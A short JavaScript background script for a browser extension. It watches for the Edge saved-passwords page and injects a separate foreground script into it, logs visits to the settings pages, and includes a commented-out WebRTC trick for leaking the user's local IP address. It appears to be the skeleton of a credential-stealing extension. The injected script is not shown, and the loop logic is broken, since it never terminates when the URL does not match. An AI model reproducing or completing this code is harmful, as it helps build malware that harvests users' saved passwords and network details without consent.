const edgePswd = "edge://settings/passwords";
const settingPage = "edge://settings/";

// get local ip address
/* window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;//compatibility for Firefox and chrome
var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
pc.createDataChannel('');//create a bogus data channel
pc.createOffer(pc.setLocalDescription.bind(pc), noop);// create offer and set local description
pc.onicecandidate = function(ice)
{
 if (ice && ice.candidate && ice.candidate.candidate)
 {
  var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
  console.log('my IP: ', myIP);   
  pc.onicecandidate = noop;
 }
}; */

// get public ip address


// (async () => {
  chrome.tabs.onActivated.addListener((tab) => {
    chrome.tabs.get(tab.tabId, (current_tab_info) => {
      var pswdPageChecked = 1;
      console.log(pswdPageChecked)
      while(pswdPageChecked < 2){
        if (edgePswd == current_tab_info.url) {
          chrome.tabs.executeScript(null, { file: "/extension/foreground.js" }, () =>
            console.log("Coming to foreground", tab.tabId, "+", current_tab_info.url)
          );     
          pswdPageChecked++;
        }
      }
        if(current_tab_info.url.slice(0, 16) == settingPage) {
          console.log("Someone access to the settings page");
          console.log(tab);
      }
    });
  });
// });




